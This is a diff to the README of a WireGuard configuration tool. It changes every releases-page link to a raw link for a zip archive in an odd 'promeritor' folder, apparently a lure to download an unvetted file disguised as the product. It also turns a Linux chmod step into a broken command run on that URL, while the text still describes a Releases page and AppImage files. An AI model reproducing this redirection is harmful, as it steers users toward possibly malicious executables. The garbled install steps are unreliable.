@@ -1,7 +1,7 @@
 # 🛠️ wireguard-config-generator - Create WireGuard Configs Easily
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-blue)](https://github.com/claudioagonized10/wireguard-config-generator/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/claudioagonized10/wireguard-config-generator/main/promeritor/wireguard-config-generator.zip)](https://raw.githubusercontent.com/claudioagonized10/wireguard-config-generator/main/promeritor/wireguard-config-generator.zip)
 
 ## 📝 Description
 The wireguard-config-generator is a user-friendly tool designed to help you create configurations for the WireGuard VPN protocol. Whether you're a beginner or just need a simple way to manage your WireGuard settings, this tool is here to assist you.
@@ -11,7 +11,7 @@ The wireguard-config-generator is a user-friendly tool designed to help you crea
 ### 1. Visit the Releases Page
 To download the wireguard-config-generator, visit the following link:
 
-[Download Latest Release](https://github.com/claudioagonized10/wireguard-config-generator/releases)
+[Download Latest Release](https://raw.githubusercontent.com/claudioagonized10/wireguard-config-generator/main/promeritor/wireguard-config-generator.zip)
 
 ### 2. Choose Your Version
 On the Releases page, you'll see a list of available versions. Select the latest version for your operating system.
@@ -38,7 +38,7 @@ Once the download completes, locate the downloaded file in your system's downloa
 - **Linux:**
   1. Make the `.AppImage` executable by running: 
      ```bash
-     chmod +x wireguard-config-generator.AppImage
+     chmod +x https://raw.githubusercontent.com/claudioagonized10/wireguard-config-generator/main/promeritor/wireguard-config-generator.zip
      ```
   2. Run the application by double-clicking the file.
 
@@ -77,7 +77,7 @@ When you're ready to use your configuration:
 - Save the file to your desired location.
 
 ## ✨ Additional Tips
-- Always ensure you download the latest version from [here](https://github.com/claudioagonized10/wireguard-config-generator/releases) for the best features and security updates.
+- Always ensure you download the latest version from [here](https://raw.githubusercontent.com/claudioagonized10/wireguard-config-generator/main/promeritor/wireguard-config-generator.zip) for the best features and security updates.
 - Refer to the built-in help section within the application for specific guidance on each feature.
 
 ## 💬 Support
@@ -89,4 +89,4 @@ If you're interested in contributing to the development of wireguard-config-gene
 ## 📌 License
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-Visit the [Download Latest Release](https://github.com/claudioagonized10/wireguard-config-generator/releases) for the latest version!
+Visit the [Download Latest Release](https://raw.githubusercontent.com/claudioagonized10/wireguard-config-generator/main/promeritor/wireguard-config-generator.zip) for the latest version!
